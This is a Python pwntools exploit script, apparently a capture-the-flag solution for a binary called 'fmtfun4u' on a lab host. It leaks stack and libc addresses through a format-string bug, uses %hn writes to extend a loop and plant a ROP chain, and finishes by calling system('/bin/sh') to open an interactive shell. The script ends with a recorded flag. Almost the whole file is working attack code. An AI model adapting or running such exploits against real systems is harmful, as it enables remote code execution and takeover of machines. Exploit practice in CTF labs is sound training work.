# -*- coding: UTF-8 -*-
#!/usr/bin/env python 

from pwn import *

LOCAL  = False
Debug  = False
SERVER = '172.16.113.50'
PORT   = 12040
Binary = 'fmtfun4u'

if LOCAL:
    libc = ELF('../../libc-2.19.so')
else:
    libc = ELF('./libc.so.6')

      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote(SERVER, PORT)
else:
    r = process('./{}'.format(Binary))
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')


"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
"""


def Edit(add, value):
    
    c = add & 0xffff
    r.sendafter(':','%'+ str(c) +'c%11$hn')
    c = value & 0xffff
    r.sendafter(':','%'+ str(c) +'c%37$hn')  
    
    c = (add  & 0xffff)  + 2
    r.sendafter(':','%'+ str(c) +'c%11$hn')
    c = value >> 16 & 0xffff
    r.sendafter(':','%'+ str(c) +'c%37$hn')  
    
    c = (add & 0xffff) + 4
    r.sendafter(':','%'+ str(c) +'c%11$hn')
    c = value >> 32 & 0xffff
    r.sendafter(':','%'+ str(c) +'c%37$hn')  


if __name__ == "__main__":


    #***** Target is on Ubuntu 16.04

    # rsi rdx rcx r8 r9 rsp rsp+8 rsp+16
    # 
    
    # Local
    # 9th = libc_start_main + 245 
    # 10th or 11th -> 37th 
    
    # Remote
    # 9th = libc_start_main + 240 
    # 11th -> 37th
    
    ##### Tips #####
    # 1. change 37th by 10th, Write to arbitrary address by 37th   
    ##### Tips #####
    
    
    # Step 1 : Get the address needed
    r.sendafter(':','%6$p.%9$p.%p')
    res = r.recvuntil('\n') 
    L(res)
    loop = int(res.split('.')[0], 16) - 228
    rsp  = int(res.split('.')[0], 16) - 240
    print 'loop :',hex(loop)
    print 'rsp :',hex(rsp)
    
    # Step 2 : make for loop more 
    c = loop & 0xffff    
    r.sendafter(':','%'+ str(c) +'c%11$hn')
    
    c = 99999
    r.sendafter(':','%'+ str(c) +'c%37$hn')
    
    # Step 3 : Write ROP
      
    ## Because we can only use the return address of printf, so we need to prepare before we overwrite the return address

    if LOCAL :
        libc_base = (int(res.split('.')[1], 16) - 245 - libc.symbols['__libc_start_main']) 
    else:
        libc_base = (int(res.split('.')[1], 16) - 240 - libc.symbols['__libc_start_main']) 

    libc_sh_add = libc_base + list(libc.search('/bin/sh'))[0]
    sys_add = libc_base + libc.symbols['system']
    binary_base = int(res.split('.')[2], 16) - 0x201020
    
    print 'libc_base :',hex(libc_base)
    print 'binary_base :',hex(binary_base)

    ## 0x0000000000000ae3 : pop rdi ; ret
    ## 0x0000000000000ae0 : pop r14 ; pop r15 ; ret
    ## 0x0000000000000ade : pop r13 ; pop r14 ; pop r15 ; ret
    
    Edit(rsp+0x10, binary_base+0xade)
    Edit(rsp+0x30, binary_base+0xae3)
    Edit(rsp+0x38, libc_sh_add) 
    Edit(rsp+0x40, sys_add)

    ## overwrite returnaddress only need change last two byte
    
    c = (rsp-0x8) & 0xffff    
    r.sendafter(':','%'+ str(c) +'c%11$hn')
    
    c = (binary_base+0xae0) &0xffff
    r.sendafter(':','%'+ str(c) +'c%37$hn')
    
    r.interactive()
    
    #FLAG{FEED_MY_TURTLE}   

